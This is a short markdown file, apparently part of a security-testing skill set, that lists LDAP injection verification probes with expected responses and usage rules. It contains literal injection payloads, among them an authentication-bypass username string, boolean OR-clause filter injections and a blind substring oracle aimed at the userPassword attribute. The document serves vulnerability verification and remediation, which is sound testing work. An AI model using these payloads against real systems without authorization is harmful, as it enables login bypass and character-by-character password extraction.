# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`ldap-and-xpath-injection-ldap`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `ldap-and-xpath-injection-ldap`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Presence and bind-outcome probe

**Expected differential:** a username carrying a presence clause flips the bind from failure to success, while the escaped form fails, and no entries are modified

```text
username=*)(uid=*))%00
username=admin)(|(uid=*
username=admin (literal control, matches one entry)
```

### Boolean OR-clause count probe

**Expected differential:** appending a true OR clause returns more entries than the false clause, matching the baseline only for the false case

```text
filter=)(|(objectClass=*)
filter=)(|(objectClass=nonexistent999)
```

### Blind attribute substring oracle

**Expected differential:** a response that differs for an a* prefix versus a non-matching prefix reveals the next attribute character without reading it directly

```text
q=victim)(userPassword=a*
q=victim)(userPassword=zzz*
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
